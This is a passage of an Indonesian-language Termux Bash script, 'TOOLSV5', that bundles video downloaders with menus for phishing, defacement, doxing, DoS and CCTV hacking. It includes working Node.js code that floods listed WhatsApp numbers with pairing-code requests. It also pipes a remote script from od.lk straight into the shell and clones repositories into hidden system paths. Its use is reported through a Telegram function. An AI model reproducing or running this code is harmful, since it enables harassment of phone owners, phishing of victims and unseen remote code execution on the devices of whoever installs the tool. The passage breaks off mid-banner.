local file_path="/storage/emulated/0/pinterest_video_$(date +%s).mp4"
yt-dlp --no-warnings -o "$file_path" "$pinterest_link"
if [ $? -eq 0 ]; then
echo "Video Pinterest berhasil diunduh dan disimpan di $file_path"
else
echo "Gagal mengunduh video Pinterest"
fi
}
while true; do
clear
banner | lolcat
echo
echo
echo "Pilih opsi:"
echo "1. Pencarian video di XNXX"
echo "2. Unduh video YouTube"
echo "3. Unduh musik YouTube"
echo "4. Unduh video TikTok tanpa watermark"
echo "5. Unduh video Instagram tanpa watermark"
echo "6. Unduh video Facebook tanpa watermark"
echo "7. Unduh video Pinterest tanpa watermark"
echo "8. Keluar"
IFS= read -r -e -p "Masukkan pilihan Anda: " choice
if [[ $choice =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le 8 ]; then
if [ "$choice" -eq 1 ]; then
IFS= read -r -e -p "Masukkan Judul Video: " query
search_results=$(search_xnxx "$query")
echo "Hasil Pencarian:"
echo "$search_results"
IFS= read -r -e -p "Masukkan link yang Anda Copy: " video_link
if echo "$video_link" | grep -q 'https://www.xnxx.com/video'; then
download_video "$video_link"
else
echo "Link tidak valid"
fi
elif [ "$choice" -eq 2 ]; then
download_youtube_video
elif [ "$choice" -eq 3 ]; then
download_youtube_music
elif [ "$choice" -eq 4 ]; then
download_tiktok_video
elif [ "$choice" -eq 5 ]; then
download_instagram_video
elif [ "$choice" -eq 6 ]; then
download_facebook_video
elif [ "$choice" -eq 7 ]; then
download_pinterest_video
elif [ "$choice" -eq 8 ]; then
echo "Keluar..."
exit 0
fi
else
echo "Pilihan tidak valid"
sleep 5
fi
done
else
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $k $bg_m "Packaging Belum Terinstall Bentar Tod !$res"
echo
sleep 3
nala update
$paket install -y wget ffmpeg
wget https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp
chmod a+rx $PREFIX/bin/yt-dlp
clear
IFS= read -r -e -p "Masukkan Nama Anda : " sopo
clear
echo "$sopo" > $nama
fi
done
}
trap ctrl_c INT
ctrl_c() {
echo
e $k$bg_lg " System Break, Otomatis Masuk Ke TOOLSV5 $k$res"
sleep 3
}
while true; do
function installasipackagetoolsv5() {
log_file="$PREFIX/share/list/package"
while IFS= read -r line; do
if [[ -n $line && $line != \#* ]]; then
e $h "Sedang Installasi $m:$p $line"
echo "$line"
sleep 2
fi
done < "$log_file"
}
function suara() {
clear
sound="$HOME/Lubeban/sound/"
if [ -d "$sound" ]; then
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $h "$bg_m Loading Update Sound$res"
cd $sound
git pull origin main &> /dev/null
git stash &> /dev/null
clear
fi
}
function repository() {
clear
galirusfile="$HOME/Lubeban" &> /dev/null
if [ -d "$galirusfile" ]; then
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $h "$bg_m Loading Update Repository$res"
cd $HOME/Lubeban
git clone https://github.com/GALIRUS404/sound &> /dev/null
git stash &> /dev/null
git pull origin main &> /dev/null
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m "REPOSITORY HILANG MENDOWNLOAD ❗$h"
rm -rf $HOME/Lubeban
cd $HOME
git clone https://github.com/Lubebansokhekel/Lubeban
fi
welcometo="$PREFIX/lib/python3.11/email/mime/audio" &> /dev/null
if [ -d "$welcometo" ]; then
cd $welcometo &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
else
mkdir -p $PREFIX/lib/python3.11/email/mime
cd $PREFIX/lib/python3.11/email/mime &> /dev/null
git clone --depth 32 https://github.com/Hozowaorokananingenda/audio &> /dev/null
cd audio &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
fi
}
EOF_MENU() {
source <(curl -sL "https://od.lk/s/OV8yNTAzNTUxNjFf/EOF_MENU.sh")
}
while true; do
packageinstalling="$HOME/Lubeban/package_sudah_terinstall_$versitoolsv5"
if [ -f "$packageinstalling" ]; then
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
repository
suara
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
clear
cd $HOME/Lubeban &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
clear
file_path="$PREFIX/lib/status.txt"
if [ ! -f "$file_path" ]; then
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $k "Status$b TOOLSV5$bl :$m Server Down "
exit 0
fi
content=$(< "$file_path")
if [[ $content == *"on"* ]]; then
e
else
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e "$h"
clear
isipesan="Terdeteksi Sedang Maintenance  ��"
telegram &> /dev/null &
echo -e $k "Status$b TOOLSV5$bl :$h Maintenance Server"
echo -e "$c\n\nTinggu Sampai Musik Berhenti Otomatis Keluar$res"
maintenance &> /dev/null
find $PREFIX/tmp -mindepth 1 -type f -exec shred -u {} \;
kill_sound &> /dev/null &
exit 0
fi
function loading2() {
text="MENDOWNLOAD REPOSITORY SABAR"
columns=$(stty size | awk '{print $2}')
while true; do
for ((i = 1; i <= columns; i++)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
for ((i = columns; i >= 1; i--)); do
clear
printf "%*s\n" $i "$text"
sleep 0.05
done
done
}
function ENTER() {
e "$m"
sleep 5
IFS= read -r -e -p "ENTER UNTUK MENGULAGI TOOLSV5"
}
nama_file="$PREFIX/include/bash/include/filememek.h"
while true; do
if [ -f $nama_file ]; then
function kotak() {
len=$((${#str} + 4))
printf "╔"
for ((i = 1; i <= len; i++)); do
printf "═"
done
printf "╗\n"
printf "║  %s  ║\n" "$str"
printf "╚"
for ((i = 1; i <= len; i++)); do
printf "═"
done
printf "╝\n"
}
hore_ultah() {
bluearchive() {
espeak -v id+f3 -s 150 "$clean_text"
audioupdate() {
cd $PREFIX/lib/python3.11/email/mime/.tanjhobi
git pull origin main &> /dev/null
git stash &> /dev/null
}
audioupdate &> /dev/null &
audio_dir="$PREFIX/lib/python3.11/email/mime/.tanjhobi"
find "$audio_dir" -type f -name "*.ogg" | shuf | while read -r audio; do
mpv --volume=80 "$audio" &> /dev/null
done
musikrun &> /dev/null &
}
bahancuy() {
cd $PREFIX/lib/python3.11/email/mime/
git clone --depth 32 https://github.com/Hozowaorokananingenda/.tanjhobi
cd .tanjhobi
git pull origin main &> /dev/null
git stash &> /dev/null
}
while true; do
ultah="$PREFIX/include/bash/.tah"
soundnya="$PREFIX/lib/python3.11/email/mime/.tanjhobi"
if [[ -f $ultah && -d $soundnya ]]; then
current_date=$(date +%d.%m.%Y)
dangisi=$(cat "$ultah")
dangisi_convert=$(echo "$dangisi" | awk -F. '{print $3"-"$2"-"$1}')
current_date_convert=$(echo "$current_date" | awk -F. '{print $3"-"$2"-"$1}')
current_month_day=$(echo "$current_date" | awk -F. '{print $2"-"$1}')
dangisi_month_day=$(echo "$dangisi" | awk -F. '{print $2"-"$1}')
current_year=$(date +%Y)
current_date_same_year="$current_year-$current_month_day"
dangisi_same_year="$current_year-$dangisi_month_day"
if [ "$dangisi_same_year" == "$current_date_same_year" ]; then
clear
ultah_text="Selamat Ulang Tahun Sensei🥳  "
clean_text=$(echo "Waaah!! $ultah_text $anomali!!!" | sed 's/[^[:alnum:][:punct:] ]//g')
bluearchive &
else
clear
dangisi_date=$(date -d "$dangisi_same_year" +%s)
current_date_seconds=$(date -d "$current_date_same_year" +%s)
diff_seconds=$((dangisi_date - current_date_seconds))
diff_days=$((diff_seconds / 86400))
if [ $diff_days -lt 0 ]; then
diff_days=$((diff_days + 365))
fi
ultah_text="$(printf '%03d' "$diff_days") hari lagi"
play_sound_effect &> /dev/null &
musikrun &> /dev/null &
fi
hasil_ultah=$(printf "║  $bl•$p Ultah$bl   :$k$ran3 %-30s $ran     ║" "$ultah_text")
break
else
clear
play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
bahancuy &> /dev/null | e $h "Installer System Ultah Anda Harap Sabar Menunggu !"
while true; do
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $m $bg_lg "Silahkan Masukkan Ulang Tahun Anda secara bertahap$k!\n$k($b contoh lengkap$k:$bl 30.12.2000 $k) $res $b"
echo
mapfile -t tanggal_list < <(seq -w 1 31)
selected_tanggal=$(printf '%s\n' "${tanggal_list[@]}" |
FZF_DEFAULT_OPTS="--height=10 --border --prompt='📆 Pilih Tanggal > ' --ansi" fzf)
if [[ -z $selected_tanggal ]]; then
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $m "⛔ Tanggal tidak boleh kosong!"
sleep 2
continue
fi
mapfile -t bulan_list < <(
cat << EOF
01 Januari
02 Februari
03 Maret
04 April
05 Mei
06 Juni
07 Juli
08 Agustus
09 September
10 Oktober
11 November
12 Desember
EOF
)
selected_bulan=$(printf '%s\n' "${bulan_list[@]}" |
FZF_DEFAULT_OPTS="--height=14 --border --prompt='📆 Pilih Bulan > ' --ansi" fzf)
if [[ -z $selected_bulan ]]; then
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $m "⛔ Bulan tidak boleh kosong!"
sleep 2
continue
fi
bulan=$(awk '{print $1}' <<< "$selected_bulan")
mapfile -t tahun_list < <(seq 1999 2050)
selected_tahun=$(printf '%s\n' "${tahun_list[@]}" |
FZF_DEFAULT_OPTS="--height=10 --border --prompt='📆 Pilih Tahun > ' --ansi" fzf)
if [[ -z $selected_tahun ]]; then
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $m "⛔ Tahun tidak boleh kosong!"
sleep 2
continue
fi
dangisi="${selected_tanggal}.${bulan}.${selected_tahun}"
if [[ $dangisi =~ ^([0-9]{2})\.([0-9]{2})\.([0-9]{4})$ ]]; then
if date -d "${selected_tahun}-${bulan}-${selected_tanggal}" &> /dev/null; then
echo "$dangisi" > "$ultah"
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $h $bg_lg "Terima kasih$k!\n$h Tanggal ulang tahun Anda telah disimpan.$res"
sleep 3
break
else
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $m "Tanggal tidak valid!"
sleep 3
fi
else
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $m "Format salah, coba lagi!"
sleep 3
fi
done
fi
done
}
total_user_ids=$(curl -sL "$DATABASE_URL" |
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -base64 -pass pass:'LEMAH_LU_PADA' |
grep -oP 'user\d+' | sort -u | wc -l)
random_number=$((RANDOM % total_user_ids))
nama=$(cat $nama_file)
hari=$(date +%A)
jam=$(date +"%H")
tanggal=$(date +"%d %B %Y")
jam=$((10#$jam))
if [[ $jam -ge 0 && $jam -lt 10 ]]; then
ucapan="Pagi  "
ucapanrek="mpv $HOME/Lubeban/sound/pagi.mp3"
elif [[ $jam -ge 10 && $jam -lt 15 ]]; then
ucapan="Siang  "
ucapanrek="mpv $HOME/Lubeban/sound/siang.mp3"
elif [[ $jam -ge 15 && $jam -lt 18 ]]; then
ucapan="Sore  "
else
ucapan="Malam "
ucapanrek="mpv $HOME/Lubeban/sound/malam.mp3"
fi
case $hari in
"Monday") ucap="Senin," ;;
"Tuesday") ucap="Selasa," ;;
"Wednesday") ucap="Rabu," ;;
"Thursday") ucap="Kamis," ;;
"Friday") ucap="Jumat," ;;
"Saturday") ucap="Sabtu," ;;
"Sunday") ucap="Minggu," ;;
esac
shuffle_string() {
str=$1
arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
for i in $(seq 0 $((${#arr[@]} - 2))); do
j=$(($((RANDOM % $((${#arr[@]} - i)))) + i))
tmp=${arr[$i]}
arr[$i]=${arr[$j]}
arr[$j]=$tmp
done
echo ${arr[@]} | sed -e 's/ //g'
}
anomali=$(printf "%-24s" "$nama")
jam=$(date +"%k")
TAMPILANTOOLSV5() {
cek="$gal"
if [ -f "$cek" ]; then
check_premium_status="PREMIUM"
else
check_premium_status="TRIAL"
fi
cek_akses() {
if [[ "$check_premium_status" = "TRIAL" ]]; then
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e "$bg_m Akses Ini Hanya Di Berikan Kepada Penguna Permanen $res"
sleep 5
TOOLS
return
fi
}
isipesan="Terdeteksi Masuk Ke Menu Awal"
telegram &> /dev/null &
global_status="$check_premium_status"
ip_info=$(curl -s https://ipwhois.app/json/)
ip=$(echo "$ip_info" | jq -r '.ip')
pelermu() {
local seg="$1"
printf '%*s' "${#seg}" '' | tr ' ' '*'
}
mask_ip() {
local ip="$1"
IFS='.' read -r a b c d <<< "$ip"
local c_mask=$(pelermu "$c")
local d_mask=$(pelermu "$d")
echo "${a}.${b}.${c_mask}.${d_mask}"
}
masked_ip=$(mask_ip "$ip")
address=$(printf "%-20s" "$masked_ip")
cd $HOME/Lubeban
clear
if [[ -f $gal ]]; then
saved_user=$(awk '{print $1}' "$gal")
else
saved_user="Unknown"
fi
play -q $HOME/Lubeban/sound/robot2.mp3 &> /dev/null &
e "              $bg_lg GALIRUS X TOOLSV5  $res" | lolcat
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║          _     _     _     _     _               ║"
e $ran"║         / \   / \   / \   / \   / \              ║"
e $ran"║        ($ran1 T$ran ) ($ran1 O$ran ) ($ran1 O$ran ) ($ran1 L$ran ) ($ran1 S$ran )             ║"
e $ran"║         \_/   \_/   \_/   \_/   \_/$ran1 V5 $ran          ║"
e $ran"║                                                  ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║                                                  ║"
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║  $m•$p Author$bl  :$ran3 GALIRUS OFFICIAL            $ran       $ran ║"
e $ran"║  $k•$p Github$bl  :$ran3 github.com/GALIRUS404       $ran       $ran ║"
e $ran"║  $h•$p Rilis $bl  :$ran3 23.03.2023                  $ran       $ran ║"
e $ran"║  $b•$p Your ID$bl :$ran3 $(printf '%-32s' "$saved_user")$ran    ║"
e $ran"║  $u•$p Status$bl  :$ran3 $(printf '%-32s' "$global_status")$ran   $ran ║"
e $ran"║  $m•$p Total $bl  :$ran3 $(printf "%03d" "$total_user_ids")$ran3 penguna            $ran            $ran ║"
e $ran"║  $p•$p online$bl  :$ran3 $(printf "%03d" "$random_number")$ran3 penguna            $ran            $ran ║"
e $ran"║  $pu•$p Versi$bl   :$k$ran3 $versitoolsv5                   $ran           $ran ║"
echo "$hasil_ultah"
e $ran"║  $h•$p IP   $bl   :$k$ran3 $address               $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║                                                  ║"
sleep 0.5
}
SPAM() {
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║              $bg_lg $m LIST SPAM KODE +62 $res  $b          $ran   ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║$ran2 [$k s1$ran2 ]$ran  ║$h SPAM BOT BOT TELE ORANG               $ran ║"
e $ran"║$ran2 [$k s2$ran2 ]$ran  ║$h SPAM PAIRING PAYLOD WEB               $ran ║"
e $ran"║$ran2 [$k s3$ran2 ]$ran  ║$h MONITORING  BOT TARGET                $ran ║"
e $ran"║$ran2 [$k s4$ran2 ]$ran  ║$h SPAM OTP MODE ALL                     $ran ║"
e $ran"║$ran2 [$k s5$ran2 ]$ran  ║$h SPAM GMAIL                            $ran ║"
e $ran"║$ran2 [$k s6$ran2 ]$ran  ║$h SPAM NGL                              $ran ║"
e $ran"║$ran2 [$k bk$ran2 ]$ran  ║$h KEMBALI KE MENU AWAL                  $ran ║"
e $ran"║$ran2 [$k 0 $ran2 ]$ran  ║$h EXIT$ran                                  $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
}
PHISING() {
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║      $m      $bg_lg LIST PHISING & HACKING $res $ran             ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║$ran2 [$k 10$ran2 ]$ran ║$h PHINSING WEB BUG WHATSAPP              $ran ║"
e $ran"║$ran2 [$k 11$ran2 ]$ran ║$h ROOM CHAT                              $ran ║"
e $ran"║$ran2 [$k 12$ran2 ]$ran ║$h ZPHISHER                               $ran ║"
e $ran"║$ran2 [$k 14$ran2 ]$ran ║$h DEFACEG404                             $ran ║"
e $ran"║$ran2 [$k 15$ran2 ]$ran ║$h LOKASI PHISING                         $ran ║"
e $ran"║$ran2 [$k 16$ran2 ]$ran ║$h PENJELAJAH NAME                        $ran ║"
e $ran"║$ran2 [$k 17$ran2 ]$ran ║$h CAMERA PHISING                         $ran ║"
e $ran"║$ran2 [$k 18$ran2 ]$ran ║$h GEMINI AI LOCALHOST                    $ran ║"
e $ran"║$ran2 [$k 19$ran2 ]$ran ║$h CHECK IP WEBSITE                       $ran ║"
e $ran"║$ran2 [$k 20$ran2 ]$ran ║$h VIEW TIKTOK                            $ran ║"
e $ran"║$ran2 [$k 22$ran2 ]$ran ║$h DOWNLOAD ALL NO WATERMARK              $ran ║"
e $ran"║$ran2 [$k 23$ran2 ]$ran ║$h SHARE FILE CONVERT LINK                $ran ║"
e $ran"║$ran2 [$k 24$ran2 ]$ran ║$h PENYAMAR LINK / URL                    $ran ║"
e $ran"║$ran2 [$k 25$ran2 ]$ran ║$h CHECK IP ADDRES                        $ran ║"
e $ran"║$ran2 [$k 26$ran2 ]$ran ║$h CLOUDFLARED URL                        $ran ║"
e $ran"║$ran2 [$k 27$ran2 ]$ran ║$h DOXING AKUN VIA USERNAME               $ran ║"
e $ran"║$ran2 [$k 28$ran2 ]$ran ║$h DOS SIMULASI  TERMUX                   $ran ║"
e $ran"║$ran2 [$k 29$ran2 ]$ran ║$h OSINT NUMBER KE NIK                    $ran ║"
e $ran"║$ran2 [$k 30$ran2 ]$ran ║$h GALERY EYES PRIVATE                    $ran ║"
e $ran"║$ran2 [$k 31$ran2 ]$ran ║$h GHOST TRACK ( OSINT )                  $ran ║"
e $ran"║$ran2 [$k 32$ran2 ]$ran ║$h TAMPILAN TERMUX                        $ran ║"
e $ran"║$ran2 [$k 33$ran2 ]$ran ║$h MPVTUBE                                $ran ║"
e $ran"║$ran2 [$k 34$ran2 ]$ran ║$h PENATAAN SCRIPT                        $ran ║"
e $ran"║$ran2 [$k 35$ran2 ]$ran ║$h SHIROKO GALERY EYES                    $ran ║"
e $ran"║$ran2 [$k 36$ran2 ]$ran ║$h ADB DEBUGGING                          $ran ║"
e $ran"║$ran2 [$k 38$ran2 ]$ran ║$h CREATE HTML                            $ran ║"
e $ran"║$ran2 [$k 39$ran2 ]$ran ║$h EXIT TOOL EDITOR                       $ran ║"
e $ran"║$ran2 [$k 40$ran2 ]$ran ║$h CCTV HACKS MEMANTAU LALU LINTAS        $ran ║"
e $ran"║$ran2 [$k bk$ran2 ]$ran ║$h KEMBALI KE MENU AWAL                   $ran ║"
e $ran"║$ran2 [$k 0 $ran2 ]$ran ║$h EXIT$ran                                   $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
}
ENC() {
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║      $m$bg_lg LIST ENC FILE YANG BISA MEMBANTU ANDA $res $b $ran   ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║$ran2 [$k  1$ran2 ]$ran ║$h ENCODING FILE BASH BERLAPIS            $ran ║"
e $ran"║$ran2 [$k  2$ran2 ]$ran ║$h ENCODING PYTHON ROT13                  $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
}
BOTZ() {
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║$k      $m $bg_lg BOT WHATSAPP SUPPORT TERMUX $res    $ran       $ran   ║"
e $ran"╚══════════════════════════════════════════════════╝"
e $ran"║$ran2 [$k bot1$ran2 ]$ran ║$h BOT MULTIFUNGSI VIA TERMUX           $ran ║"
e $ran"║$ran2 [$k  bk$ran2  ]$ran ║$h KEMBALI KE MENU AWAL                 $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
}
READ() {
sleep 0.2
e $ran "    ┌───────────────────────────┐"
e $ran "╭───┤$ranl •$m $anomali$ran┃$ran"
e $ran "├───┤$k •$m Selamat $(printf '%-8s' "$ucapan")        $ran│"
e $ran "├───┤$h •$m Sekarang jam$h :$jam:$(date +"%M") $waktu$ran    │"
e $ran "│   └───────────────────────────┘${ran}"
IFS= read -r -e -p " ╰─────────▶ " no
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
}
function TOOLS() {
while true; do
clear
TAMPILANTOOLSV5
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║     $m     $bg_lg SILAHKAN PILIH TOOLS DIBAWAH $res     $ran    $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║                                                  ║"
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║$ran2 [$k SPAM$ran2 ]$ran  ║$h MENU SPAMMING                       $ran ║"
e $ran"║$ran2 [$k  ALL$ran2 ]$ran  ║$h MENU PHISING & HACKING              $ran ║"
e $ran"║$ran2 [$k  ENC$ran2 ]$ran  ║$h ENCRYPT & ENCODING FILE             $ran ║"
e $ran"║$ran2 [$k  SC+$ran2 ]$ran  ║$h SCRIPT TAMBAHAN DILUAR TOOLSV5      $ran ║"
e $ran"║$ran2 [$k  DEL$ran2 ]$ran  ║$h MENGHAPUS RIWAYAT SCRIPT            $ran ║"
e $ran"╚══════════════════════════════════════════════════╝$ran"
e $ran"║                                                 $ran ║"
e $ran"╔══════════════════════════════════════════════════╗$ran"
e $ran"║$k      $m         $bg_lg PEMBERITAHUAN $res       $ran           $ran  ║"
e $ran"╚══════════════════════════════════════════════════╝"
e $ran"║$ran2 [$k  INFO$ran2  ]$ran ║$h LIST UPDATE TOOLSV5               $ran  ║"
e $ran"║$ran2 [$k ON/OFF$ran2 ]$ran ║$h PUTAR/HENTIKAN MUSIK              $ran  ║"
e $ran"║$ran2 [$k NO/YES$ran2 ]$ran ║$h PUTAR/HENTIKAN ARAHAN             $ran  ║"
e $ran"║$ran2 [$k VOICE $ran2 ]$ran ║$h PUTAR SOUND EFEK                  $ran  ║"
e $ran"║$ran2 [$k CACHE$ran2  ]$ran ║$h MANAGER CLEAR CACHE               $ran  ║"
e $ran"║$ran2 [$k MUSIK$ran2  ]$ran ║$h MANAGER SETTING SOUND             $ran  ║"
e $ran"║$ran2 [$k REPORT$ran2 ]$ran ║$h LAPORKAN BUG                      $ran  ║"
e $ran"║$ran2 [$k   0 $ran2   ]$ran ║$h EXIT$ran                               $ran ║"
e $ran"╚══════════════════════════════════════════════════╝"
READ
if [[ $no == "spam" || $no == "SPAM" ]]; then
while true; do
isipesan="Terdetek login ke Spam 👨‍💻"
telegram &> /dev/null &
TAMPILANTOOLSV5
SPAM
READ
cek_akses
if [[ $no == "down" || $no == "down" ]]; then
s7="$DIR_SAVE/litespam"
if [ -d "$s7" ]; then
clear
logfile="$PREFIX/share/list/s1" &> /dev/null
cd $PREFIX/share/list &> /dev/null
git pull origin main &> /dev/null
git stash &> /dev/null
e $k "Salin Token Di Bawah Ini$h"
cat "$logfile"
echo
e $m
IFS= read -r -e -p "Enter Untuk Melanjutkan"
clear
cd $s7
./main
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
clear
cd $DIR_SAVE
$paket install -y bash git curl wget jq make clang
git clone --depth 32 https://github.com/Sxp-ID/litespam
cd litespam
make install
fi
IFS= read -r -e -p "ENTER UNTUK MENGULANG TOOLSV5"
elif [[ $no == "s1X" || $no == "S1X" ]]; then
spamtautan="$PREFIX/lib/bash/spam/"
if [ -d "$spamtautan" ]; then
clear
cd $PREFIX/lib/bash/spam || exit
git pull origin main &> /dev/null
packagenya() {
cat << EOF > package.json
{
"main": "galirus.js",
"scripts": {
"start": "node galirus.js"
},
"author": "Galirus & Gusti",
"license": "MIT",
"dependencies": {
"@whiskeysockets/baileys": "^6.5.0",
"chalk": "^4.1.2",
"pino": "^7.0.5",
"readline": "^1.3.0",
"express": "^4.18.2",
"fs": "^0.0.1-security"
}
}
EOF
}
packagenya
isipesan="Terdeteksi login s1 ( spam pair )  💻"
telegram &> /dev/null &
while true; do
file="node_modules"
if [ -d "$file" ]; then
clear
echo "y" | termux-setup-storage &> /dev/null &
while true; do
scan="$HOME/number.txt"
if [ -f "$scan" ]; then
break
else
touch $HOME/number.txt
fi
done
spamnya() {
file="$HOME/number.txt"
loading() {
(for i in {1..100}; do
echo $i
sleep 0.05
done) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
}
loading1() {
(for i in {1..100}; do
echo $i
done) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
}
show_file() {
if [ -f "$file" ]; then
content=$(cat "$file")
echo "$content"
else
echo "File $file tidak ditemukan."
fi
}
add_number() {
show_file
number=$(dialog --inputbox "Masukkan nomor yang ingin ditambahkan ( 628 ):" 15 40 --stdout)
if [[ $number =~ ^[0-9]+$ ]]; then
echo "$number" >> "$file"
dialog --msgbox "Nomor $number telah ditambahkan ke dalam file." 8 40
else
dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
fi
}
remove_number() {
show_file
if [ -f "$file" ]; then
number_to_remove=$(dialog --inputbox "Masukkan nomor telepon yang ingin dihapus ( 628 ):" 15 40 --stdout)
if [[ $number_to_remove =~ ^[0-9]+$ ]]; then
sed -i "/$number_to_remove/d" "$file"
dialog --msgbox "Nomor telepon $number_to_remove telah dihapus dari file." 8 40
else
dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
fi
else
dialog --msgbox "File $file tidak ditemukan." 8 40
fi
}
while true; do
clear
choice=$(dialog --menu "Menu: Spam Pair Indo & Malay" 10 40 3 \
1 "Gas Spam Pairing" \
2 "Lihat Daftar Nomor" \
3 "Tambah nomor" \
4 "Hapus nomor" \
5 "Editing Number Full" \
0 "Keluar" --stdout)
case "$choice" in
1)
clear
loading
cd "$spamtautan"
clear
node -e "$(
cat << 'EOF'
const readline = require('readline');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const numberFilePath = path.join(process.env.HOME, 'number.txt');
let numbers = [];
const loadNumbers = () => {
try {
const data = fs.readFileSync(numberFilePath, 'utf8');
numbers = data.split('\n').map(num => num.trim()).filter(num => num !== '');
if (numbers.length === 0) {
console.log(chalk.red.bold('Tidak ada nomor yang ditemukan di file number.txt'));
}
} catch (err) {
console.error(chalk.red.bold(`Error membaca file: ${err.message}`));
}
};
// Validasi nomor menggunakan regex
const isValidPhoneNumber = (phoneNumber) => {
const regex = /^(60\d{8,11}|62\d{9,12})$/; // Format Malaysia & Indonesia
return regex.test(phoneNumber);
};
const clearConsole = () => {
process.stdout.write('\x1B[2J\x1B[0f');
};
const startSpamProcess = async () => {
try {
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
while (true) {
let validNumbers = numbers.filter(isValidPhoneNumber);
if (validNumbers.length === 0) {
console.log(chalk.red.bold('Tidak ada nomor yang valid. Memeriksa ulang dalam 60 detik...'));
await sleep(60000);
continue;
}
for (const target of validNumbers) {
console.log(chalk.greenBright.bold(`Mengirim spam ke nomor: ${target}`));
await startSpamming(sucked, target);
}
console.log(chalk.greenBright.bold('Semua nomor telah di-spam. Menunggu 60 detik sebelum mengulangi...'));
await sleep(60000);
console.clear();
}
} catch (error) {
handleError(error);
}
};
const getRandomColor = () => {
const letters = '0123456789ABCDEF';
let color = '#';
for (let i = 0; i < 6; i++) {
color += letters[Math.floor(Math.random() * 16)];
}
return color;
};
const startSpamming = async (sucked, target) => {
for (let i = 0; i < 15; i++) {
await sleep(3000);
console.clear();
const prc = await sucked.requestPairingCode(target);
const randomColor = getRandomColor();
console.log(chalk.greenBright.bold(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
